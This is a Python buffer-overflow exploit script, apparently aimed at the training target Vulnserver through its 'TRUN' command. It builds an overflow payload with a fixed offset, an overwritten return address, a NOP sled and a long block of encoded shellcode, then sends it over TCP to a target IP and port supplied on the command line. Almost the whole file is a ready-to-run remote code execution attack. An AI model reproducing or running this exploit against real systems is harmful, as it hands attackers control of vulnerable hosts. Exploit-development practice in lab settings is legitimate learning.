import socket
import struct
import argparse
import socket
import subprocess
import sys
import os

exploit = ""
exploit += "\xdb\xcd\xd9\x74\x24\xf4\x58\x31\xc9\xbb\xb2\xe8"
exploit += "\xbe\xc4\xb1\x52\x31\x58\x17\x83\xe8\xfc\x03\xea"
exploit += "\xfb\x5c\x31\xf6\x14\x22\xba\x06\xe5\x43\x32\xe3"
exploit += "\xd4\x43\x20\x60\x46\x74\x22\x24\x6b\xff\x66\xdc"
exploit += "\xf8\x8d\xae\xd3\x49\x3b\x89\xda\x4a\x10\xe9\x7d"
exploit += "\xc9\x6b\x3e\x5d\xf0\xa3\x33\x9c\x35\xd9\xbe\xcc"
exploit += "\xee\x95\x6d\xe0\x9b\xe0\xad\x8b\xd0\xe5\xb5\x68"
exploit += "\xa0\x04\x97\x3f\xba\x5e\x37\xbe\x6f\xeb\x7e\xd8"
exploit += "\x6c\xd6\xc9\x53\x46\xac\xcb\xb5\x96\x4d\x67\xf8"
exploit += "\x16\xbc\x79\x3d\x90\x5f\x0c\x37\xe2\xe2\x17\x8c"
exploit += "\x98\x38\x9d\x16\x3a\xca\x05\xf2\xba\x1f\xd3\x71"
exploit += "\xb0\xd4\x97\xdd\xd5\xeb\x74\x56\xe1\x60\x7b\xb8"
exploit += "\x63\x32\x58\x1c\x2f\xe0\xc1\x05\x95\x47\xfd\x55"
exploit += "\x76\x37\x5b\x1e\x9b\x2c\xd6\x7d\xf4\x81\xdb\x7d"
exploit += "\x04\x8e\x6c\x0e\x36\x11\xc7\x98\x7a\xda\xc1\x5f"
exploit += "\x7c\xf1\xb6\xcf\x83\xfa\xc6\xc6\x47\xae\x96\x70"
exploit += "\x61\xcf\x7c\x80\x8e\x1a\xd2\xd0\x20\xf5\x93\x80"
exploit += "\x80\xa5\x7b\xca\x0e\x99\x9c\xf5\xc4\xb2\x37\x0c"
exploit += "\x8f\x7c\x6f\x0e\x43\x15\x72\x0e\x4a\xb9\xfb\xe8"
exploit += "\x06\x51\xaa\xa3\xbe\xc8\xf7\x3f\x5e\x14\x22\x3a"
exploit += "\x60\x9e\xc1\xbb\x2f\x57\xaf\xaf\xd8\x97\xfa\x8d"
exploit += "\x4f\xa7\xd0\xb9\x0c\x3a\xbf\x39\x5a\x27\x68\x6e"
exploit += "\x0b\x99\x61\xfa\xa1\x80\xdb\x18\x38\x54\x23\x98"
exploit += "\xe7\xa5\xaa\x21\x65\x91\x88\x31\xb3\x1a\x95\x65"
exploit += "\x6b\x4d\x43\xd3\xcd\x27\x25\x8d\x87\x94\xef\x59"
exploit += "\x51\xd7\x2f\x1f\x5e\x32\xc6\xff\xef\xeb\x9f\x00"
exploit += "\xdf\x7b\x28\x79\x3d\x1c\xd7\x50\x85\x2c\x92\xf8"
exploit += "\xac\xa4\x7b\x69\xed\xa8\x7b\x44\x32\xd5\xff\x6c"
exploit += "\xcb\x22\x1f\x05\xce\x6f\xa7\xf6\xa2\xe0\x42\xf8"
exploit += "\x11\x00\x47"


cmd = "TRUN /.:/"
offset = "A" * 2003
eip = "\xAF\x11\x50\x62"
nop = "\x90" * 32

payload = cmd + offset + eip + nop + exploit + "C" * (5060 - 2003 - 4 - 16 - len(exploit))


class Buffer():
    def __init__(self,TCP_IP, TCP_PORT):
        self.TCP_IP = TCP_IP
        self.TCP_PORT = TCP_PORT

    def oscmd(self, cmd):
        p = subprocess.Popen(
            cmd, shell=False,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE
        )
        stdout, stderr = p.communicate()
        return stdout.decode(), stderr.decode()

    def send_buffer(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((self.TCP_IP, self.TCP_PORT))
            s.send((payload.encode('latin-1')))
            s.close()
        except:
            print("Error Connection the server")
            sys.exit()

    def run(self):
        try:
            self.send_buffer()
        except Exception as e:
            print(e)


if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('TCP_IP', type=str, help='Specify IP of the target: e.g. 192.168.1.X')
    parser.add_argument('TCP_PORT', type=int, help='Specify Port of the target: e.g. 443')
    args = parser.parse_args()
    exec = Buffer(args.TCP_IP, args.TCP_PORT)
    exec.run()